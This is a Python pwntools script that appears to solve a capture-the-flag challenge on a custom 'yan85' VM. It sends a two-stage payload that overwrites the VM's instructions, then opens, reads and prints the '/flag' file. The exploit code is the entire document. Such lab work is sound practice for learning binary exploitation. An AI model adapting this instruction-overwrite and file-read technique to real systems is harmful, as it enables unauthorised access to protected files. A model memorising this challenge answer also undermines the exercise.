from pwn import *
from yan85_asm import assemble

p = process("./toddlerone-level-9-1")

# first set of 4 instructions will just be junk cuz ip will already be at 5th
yancode_stage2 = """
IMM a, 1
IMM b, 0x00
IMM c, 0x10
SYS 0x10, a

IMM a, 1
IMM b, 0x00
IMM c, 0x10
SYS 0x10, a

IMM a, 1
IMM b, 0
IMM c, 0
SYS 0x01, a
"""

yancode_stage2 = """
IMM a, 1
IMM b, 0x00
IMM c, 0x10
SYS 0x10 a

IMM d 0x2f
IMM b 0x00
STM b d

IMM d 0x66
IMM b 0x01
STM b d

IMM d 0x6c
IMM b 0x02
STM b d

IMM d 0x61
IMM b 0x03
STM b d

IMM d 0x67
IMM b 0x04
STM b d

IMM d 0x00
IMM b 0x05
STM b d

IMM a 0x00
IMM b 0x00
SYS 0x01, a

IMM c 0x64
SYS 0x20, c

IMM a 0x01
SYS 0x04, c

IMM a 0x00
SYS 0x08, a
"""

# We will overwrite the instructions in the memory
yancode_stage1 = """
IMM b, 1
SYS 0x2, a
"""

code = assemble(yancode_stage1, order_str='op,arg1,arg2')

print(hex(int.from_bytes(code, "little")))

print(p.clean())

payload = b""
payload += b"\x01\x40\x00\x01\x10\xFF\x01\x20\xFF\x20\x20\x40"

p.send(payload)

code = assemble(yancode_stage2, order_str='op,arg1,arg2')

payload = b""
payload += b"\x90" * 1 # alignment
payload += code

p.send(payload)

print(p.clean())

p.close()
